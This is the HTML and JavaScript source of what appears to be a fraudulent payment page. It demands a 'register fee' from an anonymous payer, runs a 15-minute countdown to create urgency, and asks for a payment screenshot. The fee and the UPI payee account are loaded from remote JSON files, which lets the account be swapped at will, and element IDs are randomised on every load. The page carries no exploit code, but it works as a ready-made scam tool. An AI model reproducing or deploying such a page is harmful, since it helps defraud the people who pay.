<!DOCTYPE HTML>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, viewport-fit=cover" />
<title>Payable Credential</title>

<!-- Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-CF10YXPBE6"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());
  gtag('config', 'G-CF10YXPBE6');
</script>

<!-- Favicon & Manifest -->
<link rel="apple-touch-icon" sizes="180x180" href="/Cloud/Ficons/apple-icon-180x180.png">
<link rel="icon" type="image/png" sizes="32x32" href="/Cloud/Ficons/favicon-32x32.png">
<link rel="manifest" href="/Cloud/Ficons/manifest.json">

<!-- Stylesheets -->
<link rel="stylesheet" type="text/css" href="styles/bootstrap.css">
<link rel="stylesheet" type="text/css" href="styles/style.css">
<link rel="stylesheet" type="text/css" href="styles/Loadin.css">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@100;200;300;400;500;600;700;800;900&display=swap" rel="stylesheet">
<link rel="stylesheet" type="text/css" href="fonts/css/fontawesome-all.min.css">    
<link rel="stylesheet" href="/Ac/Block.ccs">

<script src="/Ac/Block.js"></script>

<style>
  .button {
    background-color: #1E90FF;
    color: #fff;
    padding: 0.8rem 2rem;
    border: none;
    border-radius: 5px;
    font-size: 1rem;
    cursor: pointer;
    margin: 1rem 0;
  }
  .button:disabled {
    background-color: #ccc;
    cursor: not-allowed;
  }
  .notification {
    position: fixed;
    transform: translateX(-50%);
    background-color: dodgerblue;
    color: #fff;
    padding: 1rem 2rem;
    border-radius: 8px;
    opacity: 0;
    transition: opacity 0.3s, transform 0.3s;
    z-index: 1000;
  }
  .notification.show {
    opacity: 1;
    transform: translateX(-50%) translateY(0);
  }
  #timer {
    font-size: 2em;
    margin-top: 20px;
    color: red;
    font-weight: bold;
  }
</style>
</head>
<body class="theme-light">

<div id="loading-screen">
  <div class="spinner"></div>
  <div class="ex"></div> 
</div>

<div id="page">

  <!-- Header -->
  <div class="header header-auto-show header-logo-center mb-4 bg-white shadow">
    <a href="#" class="header-title"><img src="/styles/logo.svg" alt="logo" width="120" height="35"></a>
  </div>

  <div class="page-content">
    <br><br>

    <!-- Invoice Card -->
    <div class="card card-style">
      <div class="content">
        <center>
          <h1 class="color-highlight font-600 mb-n1">
            <svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" viewBox="0 0 24 24"><g fill="#4147d5"><path d="..."/></g></svg>
            Invoice
          </h1>
        </center>
        <br>

        <!-- Invoice Info -->
        <div class="row mb-0 mt-4">                
          <h5 class="col-4 text-start font-15">Invoice ID</h5>
          <h5 class="col-8 text-end font-14 opacity-60 font-400">#982548</h5>
          <h5 class="col-4 text-start font-15">Bill To</h5>
          <h5 class="col-8 text-end font-14 opacity-60 font-400">anonymous</h5>
          <h5 class="col-4 text-start font-15">Date</h5>
          <h5 class="col-8 text-end font-14 opacity-60 font-400" id="todaysDate"></h5>
          <h5 class="col-4 text-start font-15">Address</h5>
          <h5 class="col-8 text-end font-14 opacity-60 font-400 pb-4">you can't see address, security purpose</h5>
        </div>

        <div class="divider"></div>

        <!-- Fees -->
        <div class="d-flex mb-3">
          <div><h5 class="opacity-50 font-500">Register Fee</h5></div>
          <div class="ms-auto"><h5 id=""></h5></div>
        </div>
        <div class="d-flex mb-3">
          <div><h5 class="opacity-50 font-500">Gateway Fees</h5></div>
          <div class="ms-auto"><h5>₹0</h5></div>
        </div>
        <div class="d-flex mb-3">
          <div><h3 class="font-700">Grand Total</h3></div>
          <div class="ms-auto"><h3 id=""></h3></div>
        </div>

        <div class="divider"></div>

        <!-- Payable Amount & Copy -->
        <center>
          <p>
            Payable Amount: <span id=""></span> Rs
            <button class="button" id="">Copy Amount</button>
          </p>
        </center>
      </div>
    </div>

    <!-- Payment Instructions -->
    <div class="card card-style">
      <div class="content mb-2">
        <center><h1 class="color-highlight font-600 mb-n1">Payment Instructions</h1></center><br>
        <div class="divider divider-margins"></div>
        <center>
          <p>Please complete payment within 15 minutes. <br>Otherwise, it will EXPIRE.</p>
        </center>
        <div class="divider divider-margins"></div>
        <center><div id="timer"></div><br></center>
        <div class="divider divider-margins"></div>
        <center><p>When payment is complete, take a screenshot for confirmation.</p></center><br>
      </div>
    </div>

    <!-- Account Card -->
    <div class="card card-style bg-blue-light">
      <div class="content">
        <center><h1 class="color-white">Account</h1></center>
      </div>
      <div class="card card-style">
        <div class="content">
          <center>
            <p>Account: <span id="account-number"></span> 
            <button class="button" id="copy-account">Copy UPI</button></p>
          </center>
          <div class="divider mt-3"></div>
        </div>
      </div>
    </div>

  </div>
</div>

<!-- Notification -->
<div id="notification" class="notification">Copied!</div>

<!-- Scripts -->
<script>
  // Generate Unique IDs
  function uniqueID(base) {
    return base + '-' + Math.random().toString(36).substr(2, 6);
  }

  const registerFeeH5 = document.querySelectorAll('div.ms-auto h5')[0];
  const grandTotalH3 = document.querySelectorAll('div.ms-auto h3')[0];
  const payableSpan = document.querySelectorAll('p span')[0];
  const copyButton = document.querySelectorAll('p button')[0];

  registerFeeH5.id = uniqueID('amount-h5');
  grandTotalH3.id = uniqueID('amount-h3');
  payableSpan.id = uniqueID('routing-number');
  copyButton.id = uniqueID('copy-routing');

  // Fetch Register Fee JSON
  fetch("https://syncjson.pages.dev/Fees.json")
    .then(res => res.json())
    .then(data => {
      const amount = data.register_fee;
      registerFeeH5.textContent = "₹" + amount;
      grandTotalH3.textContent = "₹" + amount;
      payableSpan.textContent = amount;

      // Copy handler
      copyButton.addEventListener('click', () => {
        navigator.clipboard.writeText(amount)
          .then(() => alert("Amount copied: ₹" + amount));
      });
    })
    .catch(err => console.error("Error fetching JSON:", err));

  // Fetch UPI Account
  fetch('https://syncjson.pages.dev/UPI.json')
    .then(res => res.text())
    .then(text => {
      const upi = text.replace(/^"(.*)"$/, '$1').trim();
      document.getElementById("account-number").textContent = upi;
    })
    .catch(err => {
      console.error("Error fetching UPI:", err);
      document.getElementById("account-number").textContent = "Error loading";
    });

  document.getElementById('copy-account').addEventListener('click', () => {
    const upi = document.getElementById("account-number").textContent;
    navigator.clipboard.writeText(upi)
      .then(() => showNotification('UPI copied successfully!'));
  });

  function showNotification(message) {
    const notification = document.getElementById('notification');
    notification.textContent = message;
    notification.style.display = 'block';
    notification.classList.add('show');
    setTimeout(() => {
      notification.classList.remove('show');
      notification.style.display = 'none';
    }, 2000);
  }

  // Countdown Timer
  let countDownDate = new Date().getTime() + 15 * 60 * 1000;
  setInterval(() => {
    let now = new Date().getTime();
    let distance = countDownDate - now;
    let minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
    let seconds = Math.floor((distance % (1000 * 60)) / 1000);
    document.getElementById("timer").innerHTML = distance < 0 ? "EXPIRED" : minutes + "m " + seconds + "s";
  }, 1000);

  // Display Today's Date
  function getOrdinalSuffix(day) {
    if (day > 3 && day < 21) return "th";
    switch (day % 10) {
      case 1: return "st";
      case 2: return "nd";
      case 3: return "rd";
      default: return "th";
    }
  }
  function formatDate() {
    const today = new Date();
    return today.getDate() + getOrdinalSuffix(today.getDate()) + " " +
           today.toLocaleString('default', { month: 'long' }) + " " +
           today.getFullYear();
  }
  document.getElementById('todaysDate').textContent = formatDate();
</script>

</body>
</html>
